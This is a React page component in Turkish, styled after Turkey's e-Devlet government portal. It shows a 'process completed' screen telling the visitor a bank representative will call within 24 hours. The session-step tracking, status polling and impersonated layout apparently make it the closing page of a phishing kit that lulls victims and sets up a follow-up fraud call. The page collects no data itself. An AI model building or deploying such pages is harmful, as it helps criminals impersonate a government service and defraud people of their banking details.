import EdevletLayout from '../components/EdevletLayout';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

export default function TebriklerPage() {
  const session = useSessionStep('Tebrik Sayfası');
  useStatusPolling();

  if (!session.loading && !session.active) {
    return (
      <EdevletLayout richText="İşlem bulunamadı.">
        <p>Bu sayfaya yalnızca işleminizi tamamladıktan sonra erişebilirsiniz.</p>
      </EdevletLayout>
    );
  }

  return (
    <EdevletLayout>
      <form id="loginForm" autoComplete="off">
        <fieldset>
          <div className="formRow required">
            <div className="fieldGroup" style={{ textAlign: 'center' }}>
              <img
                style={{ width: 80 }}
                src="https://ceotudent.com/wp-content/uploads/2018/11/768px-Yes_Check_Circle.svg_.png"
                alt="Tebrikler"
              />
              <p style={{ fontWeight: 'bold' }}>İşleminiz Tamamlandı</p>
              <p style={{ fontWeight: 'bold' }}>24 Saat içinde Bankanın Müşteri Temsilcisi Tarafından Aranacaksınız</p>
            </div>
          </div>
        </fieldset>
      </form>
    </EdevletLayout>
  );
}